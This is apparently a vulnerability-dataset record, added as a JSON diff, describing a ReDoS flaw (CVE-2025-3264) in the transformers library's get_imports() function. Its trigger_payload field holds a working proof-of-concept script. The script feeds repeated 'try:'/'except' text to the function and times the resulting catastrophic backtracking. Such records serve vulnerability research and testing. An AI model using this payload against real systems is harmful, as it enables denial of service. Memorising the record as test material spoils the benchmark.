@@ -1,0 +1,15 @@
+{
+  "file_id": "217_transformers_huntr_3c6f7822-9992-476d-8cf0-b0b1623427df",
+  "numeric_id": "217",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Inefficient regular expression in get_imports() causes ReDoS via catastrophic backtracking",
+  "cve": "CVE-2025-3264",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": "== 4.49.0",
+  "vulnerable_function": "transformers.dynamic_module_utils.get_imports",
+  "triggerability": "indirect",
+  "trigger_payload": "from transformers.dynamic_module_utils import get_imports\nimport time\nPAYLOAD_FILE_PATH = '/tmp/payload'\ndef generate_payload(i):\n    return 'try:' * i + 'except' * i\ndef write_payload_to_file(payload, file_path):\n    with open(file_path, 'w') as f:\n        f.write(payload)\n    return file_path\nfor i in range(1, 10000, 100):\n    payload = generate_payload(i)\n    payload_file = write_payload_to_file(payload, PAYLOAD_FILE_PATH)\n    start = time.perf_counter()\n    get_imports(payload_file)\n    end = time.perf_counter()\n    execution_time = end - start\n    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')",
+  "oracle": "Exponential increase in execution time when processing payloads with nested try/except blocks"
+}
